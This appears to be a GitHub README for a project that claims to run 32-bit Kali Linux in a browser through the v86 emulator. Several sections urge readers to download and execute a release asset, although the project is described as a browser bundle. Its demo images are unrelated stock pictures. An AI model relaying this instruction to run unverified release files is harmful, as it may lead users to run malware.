# Kali JS: Run Kali Linux x86 in Browser VM — 32-bit Emulation 🚀

[![Releases](https://img.shields.io/github/v/release/luisborges06/Kali_JS?label=Releases&color=blue)](https://github.com/luisborges06/Kali_JS/releases)

![Kali Linux](https://www.kali.org/images/kali-logo.svg)

Kali_JS runs a full 32-bit Kali Linux (x86) inside your browser using the v86 emulator. Use it for demos, testing, and quick sandbox sessions. The project uses a small ISO image and the v86 runtime to boot a lightweight Kali environment without a VM hypervisor.

Tags: 32bit, boot, demo, emulator, experimental, iso, kali-linux, v86, virtualization, vm

Table of contents
- About
- Highlights
- Demo image and GIF
- What's inside
- Quick start
- Releases (download and run)
- Usage tips
- Networking and persistence
- Build and test
- Contribute
- License
- Acknowledgements
- FAQ
- Troubleshooting

About
Kali_JS boots a Kali Linux x86 image in the browser with v86. The environment runs as an emulated 32-bit machine. You get a shell, core Kali tools, and a small desktop session. The project targets demos, training, and testing workflows that need a disposable Kali instance.

Highlights
- Browser-based x86 emulation using v86.
- Small ISO that boots fast in modern browsers.
- Virtual disk support for basic persistence.
- Configurable CPU, memory and device settings.
- Works on desktop and large tablet browsers.
- No native virtualization or admin rights required.

Demo image and GIF
![v86 demo screenshot](https://upload.wikimedia.org/wikipedia/commons/thumb/0/07/Virtualbox_logo.png/640px-Virtualbox_logo.png)
![Browser VM demo GIF](https://upload.wikimedia.org/wikipedia/commons/d/d7/Animated-example.gif)

What's inside
- v86 emulator configured for a 32-bit PC (BIOS).
- Boot ISO: lightweight Kali x86 image with core tools.
- init scripts for automatic login and demo services.
- sample disk image for persistence (optional).
- launcher HTML and JavaScript wrapper for easy embedding.

Quick start

1) Get the release
- Visit the releases page and download the release asset. You must download the asset file and execute it as described below:
  https://github.com/luisborges06/Kali_JS/releases

2) Run in the browser from the release
- If the release contains an index.html or a packaged HTML bundle, open that file in your browser.
- If the release is a zip or tarball, extract it and open index.html.
- If the release provides a ready-made binary or script, download the provided file and execute it as instructed in the release notes.

3) Alternative: run from source
- Clone the repo.
- Serve the folder with a static server:
  - Python 3: python -m http.server 8000
  - Node: npx http-server -p 8000
- Open http://localhost:8000 in your browser and start the emulator.

Releases (download and run)
- Download the release asset from the releases page and run the file provided there. The release page hosts packaged builds and images. The intended flow is:
  1. Go to the releases page: https://github.com/luisborges06/Kali_JS/releases
  2. Download the asset (example name: Kali_JS-v1.0.0.zip or kali-js-iso.tar.gz)
  3. Extract the package if needed.
  4. Open index.html in a browser or run the contained launcher script.
- The release notes include checksums and basic run steps for the current build.

Usage tips
- Choose the right browser: Chrome, Edge, and Firefox work best. Other Chromium-based browsers may work.
- Allow ample memory: increase the emulated RAM if the default runs out. Edit the config in the launcher.
- Use a local server for features that need fetch or XHR; file:// may restrict some features.
- If you need more disk space, swap in a larger virtual disk image (provided or custom).

Networking and persistence
- v86 can emulate network using WebSockets or fetch proxies. Check the launcher config for the network mode.
- Persistence works via virtual disk images. The release contains a sample disk. Replace it or mount a new image file.
- For secure testing, use private networks and avoid exposing the emulator to the public web.

Build and test
- Prerequisites:
  - Node.js and npm for the build tools.
  - A static server for local testing.
- Build steps (from source):
  1. Clone repo.
  2. npm install
  3. npm run build
  4. Serve the ./dist folder.
- Tests:
  - Unit tests cover the launcher and disk handling.
  - Manual boot test verifies ISO integrity and kernel parameters.

Configuration
- config.json (or inline JS) holds emulator parameters:
  - memoryMB: amount of RAM in MB
  - cpuCount: emulated CPU cores
  - kernel: path to kernel (if separate)
  - initrd: path to initramfs
  - cdrom: path to ISO file
  - hdd: path to disk image for persistence
- You can embed the emulator in a page and pass config as a JSON object.

Contribute
- Report issues for bugs and feature requests.
- Open pull requests for fixes and improvements.
- Follow the code style in the repo and add tests for new features.
- Use issues to propose large changes before coding.

License
- This project uses an MIT-style license. See LICENSE for details.

Acknowledgements
- v86 emulator (original project) for CPU and device emulation.
- Kali Linux community for tools and images.
- Open web standards for enabling browser virtualization.

FAQ
Q: Will this replace a native VM?
A: No. The emulator targets demos and light testing. It does not offer full native performance or all device drivers.

Q: Can I run 64-bit Kali?
A: v86 focuses on x86 (32-bit). For 64-bit, use native virtualization.

Q: Is my data safe?
A: Use the persistence disk for data you want to keep. Do not store secrets in a demo environment.

Troubleshooting
- If the emulator does not boot:
  - Check that the ISO or kernel paths in config match the files.
  - Run from a local server rather than file://.
  - Verify the release asset you downloaded has not corrupted during transfer.

- If the emulator is slow:
  - Increase memory or reduce active services in the image.
  - Close other browser tabs or heavyweight apps.

- If networking fails:
  - Check the launcher network mode.
  - Ensure any proxy or WebSocket endpoint runs and accepts connections.

Example embed (snippet)
- The launcher exposes a simple API and a single HTML element for the screen.
- Example:
  1. Include v86.js and mount a div#screen.
  2. Instantiate with your config.
  3. Call start() to boot.

Security and legal
- Use Kali tools according to local laws.
- Do not use the emulator for illegal activity.

Contact
- Open an issue on the repo to request features or report bugs.
- Use pull requests for code contributions.

Additional resources
- v86 project: https://github.com/copy/v86
- Kali Linux: https://www.kali.org

Changelog
- See the releases page for version history, binaries, and checksums:
  https://github.com/luisborges06/Kali_JS/releases

Stay on the releases page for official builds and packaged assets.